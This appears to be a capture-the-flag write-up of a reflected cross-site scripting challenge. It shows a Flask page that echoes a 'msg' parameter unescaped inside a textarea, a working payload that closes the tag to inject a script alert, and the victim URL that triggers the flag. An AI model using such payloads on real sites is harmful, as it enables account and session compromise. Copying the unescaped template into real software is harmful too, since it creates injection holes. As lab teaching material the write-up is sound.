# Cross Site Scripting 4

In this challenge, we have `/challenge/server` that will server us a blog post web app. There is a `/challenge/victim`
that will act as the victim.

This challenge uses a **Reflected XSS attack**, similar to the last challenge.

The change this time is that the payload is wrapped in a `<textbox></textbox>`, so we would have to find a way to escape it.

The goal here is the same, we have to spook the victim by showing them a js alert popup.

```python
@app.route("/", methods=["GET"])
def challenge_get():
    return f"""
        <html><body>
        <h1>pwnmsg ephemeral message service</h1>
        The message:
        <form>
            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
            <input type=submit value="Make URL!">
        </form>
        </body></html>
    """
```

Very similar to how we closed `"`s in the payload during SQL injection, we can **close** the `textarea`, write our
alert script, and then add an open `textarea` tag at the end.

Therefore, the html would look like this after the payload:

```html
<textarea name=msg></textarea><script>alert("PWNED")</script><textarea></textarea>
                    ^ We control from here                            ^ All the way to here
```

Therefore, we have to make the victim access this specific URL:

```bash
/challenge/victim http://challenge.localhost:80/?msg=</textarea><script>alert("PWNED")</script><textarea>
```

The same as last challenge, the victim will get spooked if they see the alert, and will pop out the flag!

```python
try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(open("/flag").read().strip())
```